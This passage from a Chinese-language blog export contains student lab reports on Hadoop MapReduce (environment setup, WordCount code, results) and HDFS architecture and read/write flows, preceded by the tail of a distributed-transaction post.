<p>注意，这里因为订单服务使用了mybatis-plus这个框架（这是一个mybatis集成框架，自动生成单表Sql），因此我们需要用mybatis-plus的<code>MybatisSqlSessionFactoryBean</code>代替<code>SqlSessionFactoryBean</code></p>
<p>如果用的是原生的mybatis，请使用<code>SqlSessionFactoryBean</code>。</p>
<p>添加事务注解</p>
<p>给事务发起者<code>order_service</code>的<code>OrderServiceImpl</code>中的<code>createOrder()</code>方法添加<code>@GlobalTransactional</code>注解，开启全局事务</p>
<h1 id="微信支付-1"><a href="#微信支付-1" class="headerlink" title="微信支付"></a>微信支付</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022736.png" alt="image-20210415162630464"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyo</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-3 MapReduce</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-3%20MapReduce/</url>
    <content><![CDATA[<h1 id="Lab-3-MapReduce配置与操作"><a href="#Lab-3-MapReduce配置与操作" class="headerlink" title="Lab-3 MapReduce配置与操作"></a>Lab-3 MapReduce配置与操作</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="MapReduce是什么"><a href="#MapReduce是什么" class="headerlink" title="MapReduce是什么"></a>MapReduce是什么</h3><p>MapReduce 是一个分布式运算程序的编程框架，是用户开发“基于 Hadoop 的数据分析</p>
<p>应用”的核心框架。</p>
<p>MapReduce 核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的</p>
<p>分布式运算程序，并发运行在一个 Hadoop 集群上。</p>
<h3 id="MapReduce优缺点"><a href="#MapReduce优缺点" class="headerlink" title="MapReduce优缺点"></a>MapReduce优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li><p><strong>MapReduce 易于编程</strong></p>
<p>它简单的实现一些接口，就可以完成一个分布式程序，这个分布式程序可以分布到大量</p>
<p>廉价的 PC 机器上运行。也就是说你写一个分布式程序，跟写一个简单的串行程序是一模一</p>
<p>样的。就是因为这个特点使得 MapReduce 编程变得非常流行。</p>
</li>
<li><p><strong>良好的扩展性</strong></p>
<p>当你的计算资源不能得到满足的时候，你可以通过简单的增加机器来扩展它的计算能力。</p>
</li>
<li><p><strong>高容错性</strong></p>
<p>MapReduce 设计的初衷就是使程序能够部署在廉价的 PC 机器上，这就要求它具有很高</p>
<p>的容错性。比如其中一台机器挂了，它可以把上面的计算任务转移到另外一个节点上运行，</p>
<p>不至于这个任务运行失败，而且这个过程不需要人工参与，而完全是由 Hadoop 内部完成的。</p>
</li>
<li><p><strong>适合 PB 级以上海量数据的离线处理</strong></p>
<p>可以实现上千台服务器集群并发工作，提供数据处理能力。</p>
</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li><p><strong>不擅长实时计算</strong></p>
<p>MapReduce 无法像 MySQL 一样，在毫秒或者秒级内返回结果。</p>
</li>
<li><p><strong>不擅长流式计算</strong></p>
<p>流式计算的输入数据是动态的，而 MapReduce 的输入数据集是静态的，不能动态变化。</p>
<p>这是因为 MapReduce 自身的设计特点决定了数据源必须是静态的。</p>
</li>
<li><p><strong>不擅长 DAG（有向无环图）计算</strong></p>
<p>多个应用程序存在依赖关系，后一个应用程序的输入为前一个的输出。在这种情况下，</p>
<p>MapReduce 并不是不能做，而是使用后，每个 MapReduce 作业的输出结果都会写入到磁盘，</p>
<p>会造成大量的磁盘 IO，导致性能非常的低下。</p>
</li>
</ul>
<h3 id="MapReduce核心思想"><a href="#MapReduce核心思想" class="headerlink" title="MapReduce核心思想"></a>MapReduce核心思想</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220107200.png" alt="image-20210701084254232"></p>
<ul>
<li><p>分布式的运算程序往往需要分成至少 2 个阶段。</p>
</li>
<li><p>第一个阶段的 MapTask 并发实例，完全并行运行，互不相干。</p>
</li>
<li><p>第二个阶段的 ReduceTask 并发实例互不相干，但是他们的数据依赖于上一个阶段</p>
</li>
</ul>
<p>的所有 MapTask 并发实例的输出。</p>
<ul>
<li>MapReduce 编程模型只能包含一个 Map 阶段和一个 Reduce 阶段，如果用户的业</li>
</ul>
<p>务逻辑非常复杂，那就只能多个 MapReduce 程序，串行运行。</p>
<h3 id="MapReduce进程"><a href="#MapReduce进程" class="headerlink" title="MapReduce进程"></a>MapReduce进程</h3><p>一个完整的 MapReduce 程序在分布式运行时有三类实例进程：</p>
<ul>
<li><strong>MrAppMaster</strong>：负责整个程序的过程调度及状态协调。</li>
<li><strong>MapTask</strong>：负责 Map 阶段的整个数据处理流程。</li>
<li><strong>ReduceTask</strong>：负责 Reduce 阶段的整个数据处理流程。</li>
</ul>
<h3 id="常用数据序列化类型"><a href="#常用数据序列化类型" class="headerlink" title="常用数据序列化类型"></a>常用数据序列化类型</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110273.png" alt="image-20210701084749392"></p>
<h3 id="MapReduce编程规范"><a href="#MapReduce编程规范" class="headerlink" title="MapReduce编程规范"></a>MapReduce编程规范</h3><p>1．Mapper阶段</p>
<p>（1）用户自定义的Mapper要继承自己的父类</p>
<p>（2）Mapper的输入数据是KV对的形式（KV的类型可自定义） </p>
<p>（3）Mapper中的业务逻辑写在map()方法中</p>
<p>（4）Mapper的输出数据是KV对的形式（KV的类型可自定义） </p>
<p>（5）map()方法（MapTask进程）对每一个&lt;K,V&gt;调用一次</p>
<p>2．Reducer阶段</p>
<p>（1）用户自定义的Reducer要继承自己的父类</p>
<p>（2）Reducer的输入数据类型对应Mapper的输出数据类型，也是KV</p>
<p>（3）Reducer的业务逻辑写在reduce()方法中</p>
<p>（4）ReduceTask进程对每一组相同k的&lt;k,v&gt;组调用一次reduce()方法</p>
<p>3．Driver阶段</p>
<p>相当于YARN集群的客户端，用于提交我们整个程序到YARN集群，提交的是</p>
<p>封装了MapReduce程序相关运行参数的job对象</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="在Mac上配置hadoop环境"><a href="#在Mac上配置hadoop环境" class="headerlink" title="在Mac上配置hadoop环境"></a>在Mac上配置hadoop环境</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">将hadoop102里的hadoop打包复制到mac下</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">打包</span></span><br><span class="line">[huang@hadoop102 module]$ tar -zcvf hadoop-3.1.3.tar.gz /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">复制</span></span><br><span class="line">[huang@hadoop102 module]$ scp hadoop-3.1.3.tar.gz huangmingwang@10.211.55.2:/Users/huangmingwang/Documents/Hadoop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % source .bash_profile</span><br></pre></td></tr></table></figure>



<h3 id="本地测试WordCount"><a href="#本地测试WordCount" class="headerlink" title="本地测试WordCount"></a>本地测试WordCount</h3><p>WordCountDriver.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取job</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 设置jar包路径</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 关联mapper和reducer</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4 设置map输出的kv类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5 设置最终输出的kV类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6 设置输入路径和输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/input&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/output&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7 提交job</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.exit(result ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountMapper.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, map阶段输入的key的类型：LongWritable</span></span><br><span class="line"><span class="comment"> * VALUEIN,map阶段输入value类型：Text</span></span><br><span class="line"><span class="comment"> * KEYOUT,map阶段输出的Key类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEOUT,map阶段输出的value类型：IntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取一行</span></span><br><span class="line">        <span class="comment">// atguigu atguigu</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 切割</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        String[] words = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 循环写出</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="comment">// 封装outk</span></span><br><span class="line">            outK.set(word);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写出</span></span><br><span class="line">            context.write(outK, outV);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountReducer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, reduce阶段输入的key的类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEIN,reduce阶段输入value类型：IntWritable</span></span><br><span class="line"><span class="comment"> * KEYOUT,reduce阶段输出的Key类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEOUT,reduce阶段输出的value类型：IntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable,Text,IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// atguigu, (1,1)</span></span><br><span class="line">        <span class="comment">// 累加</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        outV.set(sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写出</span></span><br><span class="line">        context.write(key,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Hadoop集群测试WordCount"><a href="#Hadoop集群测试WordCount" class="headerlink" title="Hadoop集群测试WordCount"></a>Hadoop集群测试WordCount</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">创建文件夹input</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -mkdir /input</span><br><span class="line"><span class="meta"># </span><span class="language-bash">将word.txt上传到hdfs中</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -put /Users/huangmingwang/Documents/input/word.txt /input </span><br><span class="line"><span class="meta">#</span><span class="language-bash">运行wordcount程序</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>





<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h3 id="在Mac上配置hadoop环境结果"><a href="#在Mac上配置hadoop环境结果" class="headerlink" title="在Mac上配置hadoop环境结果"></a>在Mac上配置hadoop环境结果</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110274.png" alt="截屏2021-06-30 下午7.42.02"></p>
<h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><p>执行本地wordcount程序成功：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110276.png" alt="截屏2021-07-01 上午9.16.23"></p>
<p>程序输出结果展示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110277.png" alt="截屏2021-07-01 上午9.18.17"></p>
<h3 id="Hadoop集群执行wordcount结果"><a href="#Hadoop集群执行wordcount结果" class="headerlink" title="Hadoop集群执行wordcount结果"></a>Hadoop集群执行wordcount结果</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110278.png" alt="image-20210701104645182"></p>
<p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220108775.png" alt="截屏2021-07-01 上午10.47.12 (2)"></p>
<p>结果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110279.png" alt="截屏2021-07-01 上午10.48.00 (2)"></p>
<p>任务历史：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110280.png" alt="截屏2021-07-01 上午10.49.52 (2)"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h3 id="在mac上操作hdfs时报错"><a href="#在mac上操作hdfs时报错" class="headerlink" title="在mac上操作hdfs时报错"></a>在mac上操作hdfs时报错</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109737.png" alt="image-20210701100816545"></p>
<p>解决方法：</p>
<p>hadoop集群的用户权限是huang，在环境变量设置为用户为huang即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure>

<h3 id="运行wordcount程序报错"><a href="#运行wordcount程序报错" class="headerlink" title="运行wordcount程序报错"></a>运行wordcount程序报错</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109339.png" alt="1"></p>
<p>解决方法：</p>
<p>删除文件夹output，或者将输出文件夹改名；</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-2 HDFS</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-2%20HDFS/</url>
    <content><![CDATA[<h1 id="Lab-2-Hadoop-HDFS-分布式文件系统基本操作"><a href="#Lab-2-Hadoop-HDFS-分布式文件系统基本操作" class="headerlink" title="Lab-2 Hadoop(HDFS)分布式文件系统基本操作"></a>Lab-2 Hadoop(HDFS)分布式文件系统基本操作</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="HDFS是什么"><a href="#HDFS是什么" class="headerlink" title="HDFS是什么"></a>HDFS是什么</h3><p>HDFS（Hadoop Distributed File System） 是一个高度容错性的系统，适合部署在廉价的机器上。HDFS 能提供高吞吐量的数据访问，非常适合大规模数据集上的应用。HDFS 放宽了一部分 POSIX 约束，来实现流式读取文件系统数据的目的。HDFS 在最开始是作为 Apache Nutch 搜索引擎项目的基础架构而开发的。HDFS 是 Apache Hadoop Core 项目的一部分。</p>
<h4 id="HDFS优点"><a href="#HDFS优点" class="headerlink" title="HDFS优点"></a>HDFS优点</h4><ul>
<li><p>保存多个副本，且提供容错机制，副本丢失或宕机自动恢复。默认存3份。为防止某个主机失效读取不到该主机的块文件，它将同一个文件块副本分配到其他某几个主机上。</p>
</li>
<li><p>运行在廉价的机器上。</p>
</li>
<li><p>适合大数据的处理。HDFS会将一个完整的大文件平均分块存储到不同计算机上，默认会将文件分割成block，64M为1个block。然后将block按键值对存储在HDFS上，并将键值对的映射存到内存中。如果小文件太多，那内存的负担会很重。</p>
</li>
<li><p>流式数据访问，一次写入多次读写，和传统文件不同，它不支持动态改变文件内容，而是要求让文件一次写入就不做变化，要变化只能在文件末尾添加</p>
</li>
</ul>
<h4 id="HDFS缺点"><a href="#HDFS缺点" class="headerlink" title="HDFS缺点"></a>HDFS缺点</h4><ul>
<li><p>不适合低延时的数据访问，比如毫秒级的存储数据，是做不到的</p>
</li>
<li><p>无法高效的对大量小文件进行存储</p>
<ul>
<li>存储大量小文件的话，它会占用NameNode大量的内存来存储文件目录和块信息。这样是不可取的，因为NameNode的内存是有限的。</li>
<li>小文件的存储的寻址时间会超过读取时间，它违反了HDFS的设计目标</li>
</ul>
</li>
<li><p>不支持并发写入，文件随机修改</p>
<ul>
<li>一个文件只能有一个写，不允许多个线程同时写；</li>
<li>仅支持数据append（追加），不支持文件的随机修改</li>
</ul>
</li>
</ul>
<h3 id="HDFS架构"><a href="#HDFS架构" class="headerlink" title="HDFS架构"></a>HDFS架构</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103740.png" alt="image-20210628203053925"></p>
<h4 id="HDFS-client"><a href="#HDFS-client" class="headerlink" title="HDFS client"></a>HDFS client</h4><p>我们和HDFS打交道是通过一个client library。无论是读取一个文件还是写一个文件，都是先把数据交给HDFS client，它负责和Name nodes以及Data nodes联系并传输数据。</p>
<h4 id="NameNode"><a href="#NameNode" class="headerlink" title="NameNode"></a>NameNode</h4><p>在HDFS中，Namenode 保存了整个文件系统信息，包活文件和文件夹的机构。其实和linux上的很像，HDFS也是把文件和文件夹表示为inode，每个inode有自己的所有者，权限，创建的修改时间等等。HDFS可以存很大的文件，所以每个文件被分为一些data block，存在不同的机器上，name node就负责记录一个文件有哪些data block，以及这些data block分别存放在那些机器上。</p>
<p>Namenode 还负责管理文件系统常用操作，比如创建一个文件，重命名一个文件，创建一个文件夹，重命名一个文件夹等。</p>
<p>当我们通过HDFS client先HDFS读取或者写文件时，所有的都写请求都是先发给Name nodes，它负责创建或者查询一个文件，然后再让HDFS client和 Data nodes联系具体的数据传输。</p>
<h4 id="DataNode"><a href="#DataNode" class="headerlink" title="DataNode"></a>DataNode</h4><p>存储data block的机器叫做Data nodes。在读写过程中，Data nodes负责直接把用户读取的文件block传给client，也负责直接接受用户写的文件。</p>
<p>当我们读取一个文件时：</p>
<ul>
<li>HDFS client 联系 Name nodes，获取文件的 data blocks 组成、以及每个 data block 所在的机器以及具体存放位置；</li>
<li>HDFS client 联系 Data nodes, 进行具体的读写操作；</li>
</ul>
<p>重要的事情说三遍。在读写一个文件时，当我们从 Name nodes 得知应该向哪些 Data nodes 读写之后，我们就直接和 Data node 打交道，不再通过 Name nodes。</p>
<h4 id="Secondary-NameNode"><a href="#Secondary-NameNode" class="headerlink" title="Secondary NameNode"></a>Secondary NameNode</h4><p>并非NameNode的热备。当NameNode挂掉的时候，它并不能马上替换NameNode 并提供服务。</p>
<p>辅助NameNode，分担其工作量，比如定期合并Fsimage和Edits，并推送给NameNode。</p>
<p>在紧急情况下，可辅助恢复NameNode。</p>
<h3 id="HDFS文件写入"><a href="#HDFS文件写入" class="headerlink" title="HDFS文件写入"></a>HDFS文件写入</h3><p>Client向NameNode发起文件写入的请求。</p>
<ol>
<li>NameNode根据文件大小和文件块配置情况，返回给Client它所管理部分DataNode的信息。</li>
<li>Client将文件划分为多个block块，并根据DataNode的地址信息，按顺序写入到每一个DataNode块中。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103741.png" alt="58qho28cfd"></p>
<p>例如：有一个文件FileA，100M大小。Client将FileA写入到HDFS上。</p>
<ol>
<li>HDFS按默认配置。</li>
<li>HDFS分布在三个机架上Rack1，Rack2，Rack3。</li>
</ol>
<p>文件写入过程如下：</p>
<ol>
<li>Client将FileA按64M分块。分成两块，block1和Block2;</li>
<li>Client向NameNode发送写数据请求，如图蓝色虚线①——&gt;。</li>
<li>NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②———&gt;。<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>原理：<ol>
<li>NameNode具有RackAware机架感知功能，这个可以配置。</li>
<li>若Client为DataNode节点，那存储block时，规则为：副本1，同Client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。</li>
<li>若Client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。</li>
</ol>
</li>
</ol>
</li>
<li>Client向DataNode发送block1；发送过程是以流式写入。流式写入过程如下：<ol>
<li>将64M的block1按64k的package划分;</li>
<li>然后将第一个package发送给host2;</li>
<li>host2接收完后，将第一个package发送给host1，同时Client向host2发送第二个package；</li>
<li>host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。</li>
<li>以此类推，如图红线实线所示，直到将block1发送完毕。</li>
<li>host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红颜色实线所示。</li>
<li>Client收到host2发来的消息后，向NameNode发送消息，说我写完了。这样就真完成了。如图黄色粗实线</li>
<li>发送完block1后，再向host7、host8、host4发送block2，如图蓝色实线所示。</li>
<li>发送完block2后，host7、host8、host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。</li>
<li>Client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。</li>
</ol>
</li>
<li>分析：通过写过程，我们可以了解到<ol>
<li>写1T文件，我们需要3T的存储，3T的网络流量带宽。</li>
<li>在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。</li>
<li>挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。</li>
</ol>
</li>
</ol>
<h3 id="HDFS文件读取"><a href="#HDFS文件读取" class="headerlink" title="HDFS文件读取"></a>HDFS文件读取</h3><p>当文件读取：</p>
<ol>
<li>Client向NameNode发起文件读取的请求。</li>
<li>NameNode返回文件存储的block块信息、及其block块所在DataNode的信息。</li>
<li>Client读取文件信息。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104177.png" alt="1"></p>
<p>如图所示，Client要从DataNode上，读取FileA。而FileA由block1和block2组成。读操作流程如下：</p>
<ol>
<li>Client向NameNode发送读请求。</li>
<li>NameNode查看Metadata信息，返回FileA的block的位置。<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取。</li>
</ol>
<p>上面例子中，Client位于机架外，那么如果Client位于机架内某个DataNode上，例如,Client是host6。那么读取的时候，遵循的规律是：<strong>优选读取本机架上的数据。</strong></p>
<p>问题：如果读取block是按照先后顺序读，是否意味着在不同副本之间的读取是不平均的，没有考虑通过负载策略来提高读效率吗？</p>
<h3 id="备份数据的存放"><a href="#备份数据的存放" class="headerlink" title="备份数据的存放"></a>备份数据的存放</h3><p>备份数据的存放是HDFS可靠性和性能的关键。HDFS采用一种称为rack-aware的策略来决定备份数据的存放。</p>
<p>通过一个称为Rack Awareness的过程，NameNode决定每个DataNode所属rack id。</p>
<p>缺省情况下，一个block块会有三个备份：</p>
<ol>
<li>一个在NameNode指定的DataNode上</li>
<li>一个在指定DataNode非同一rack的DataNode上</li>
<li>一个在指定DataNode同一rack的DataNode上。</li>
</ol>
<p>这种策略综合考虑了同一rack失效、以及不同rack之间数据复制性能问题。</p>
<p>副本的选择：为了降低整体的带宽消耗和读取延时，HDFS会尽量读取最近的副本。如果在同一个rack上有一个副本，那么就读该副本。如果一个HDFS集群跨越多个数据中心，那么将首先尝试读本地数据中心的副本。</p>
